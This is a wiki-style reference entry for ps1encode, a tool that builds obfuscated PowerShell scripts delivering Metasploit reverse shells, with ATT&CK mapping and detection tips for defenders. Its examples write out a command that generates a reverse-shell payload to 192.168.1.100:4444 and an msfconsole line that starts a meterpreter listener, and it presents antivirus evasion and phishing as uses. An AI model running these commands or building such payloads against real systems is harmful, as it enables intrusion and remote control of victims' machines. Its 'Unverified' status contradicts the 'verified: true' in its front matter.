---
id: e98413bb-3f4c-46fa-b552-15b200951ff6
type: tool
verified: true
created_at: '2019-08-28T21:17:31.324269+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - powershell
  - payload-generation
  - obfuscation
  - metasploit
url: 'https://github.com/hausec/Ps1Encoder'
commands:
  - '[[commands/ps1encode-generate-payload]]'
  - '[[commands/ps1encode-encode-existing-script]]'
validated: true
---

# ps1encode

**Status**: Unverified

## Overview

ps1encode is a Python-based tool designed to generate and encode PowerShell scripts for delivering Metasploit payloads. It is commonly used in red team operations to create obfuscated .ps1 files that establish reverse connections to attacker-controlled listeners, helping to bypass endpoint detection and response (EDR) tools and antivirus software.

## Description

ps1encode automates the creation of PowerShell downloaders that fetch and execute payloads from Metasploit's multi/handler or similar listeners. It supports encoding techniques like Base64 to hide malicious code in memory execution. The tool is particularly useful for social engineering campaigns, such as embedding payloads in macro-enabled documents or phishing emails. It integrates well with frameworks like Metasploit and Cobalt Strike for payload staging.

## Features

- Feature 1: Automatic generation of PowerShell scripts for reverse TCP/HTTP shells
- Feature 2: Multiple encoding methods (Base64, XOR) to evade static analysis
- Feature 3: Customizable payload options, including proxy support and user-agent spoofing
- Feature 4: Support for both staged and stageless Metasploit payloads

## Installation

### Requirements

- Python 3.6+
- Git
- Metasploit Framework (for payload handling)

### Install Commands

```bash
# Clone the repository
git clone https://github.com/hausec/Ps1Encoder.git ps1encode
cd ps1encode

# Install dependencies (if any)
pip3 install -r requirements.txt

# For Kali Linux (often pre-configured with Metasploit)
# No additional steps needed if using the bundled version
```

On Windows, use Git Bash or PowerShell to run the clone and pip commands. Ensure Python is in your PATH.

## Basic Usage

```bash
python3 ps1encode.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and usage |
| --lhost | Specify the listener IP address |
| --lport | Specify the listener port |
| --encode | Enable encoding mode for existing scripts |
| -o | Output file path for generated .ps1 |
| --method | Encoding method (e.g., base64, xor) |

## Examples

### Example 1: Basic Usage

Generate a simple reverse shell payload:

```bash
python3 ps1encode.py --lhost 192.168.1.100 --lport 4444 -o shell.ps1
```

Start a Metasploit listener:

```bash
msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"
```

### Example 2: Advanced Usage

Encode an existing script with custom options:

```bash
python3 ps1encode.py --encode -i custom_script.ps1 -o encoded_shell.ps1 --method base64 --proxy http://proxy:8080
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[PowerShell]] PowerShell
- [[Remote File Copy]] Ingress Tool Transfer
- [[Obfuscated Files or Information]] Obfuscated Files or Information

### Tactics

- [[Execution]] Execution
- [[Lateral Movement]] Lateral Movement

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for PowerShell processes downloading from unusual IPs or using Base64 decoding (e.g., via Sysmon Event ID 1 with Image: powershell.exe and CommandLine containing Invoke-Expression)
- Detection method 2: Network traffic to known C2 ports (e.g., 4444) from encoded PS1 executions; check for AMSI bypass attempts
- Detection method 3: File creation events for .ps1 files with obfuscated content in temporary directories

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit]]
- [[tools/PowerSploit]]

## References

- Official GitHub: https://github.com/hausec/Ps1Encoder
- Metasploit Documentation: https://docs.metasploit.com
- PowerShell Obfuscation Techniques: https://www.blackhillsinfosec.com/powershell-obfuscation-cheatsheet/
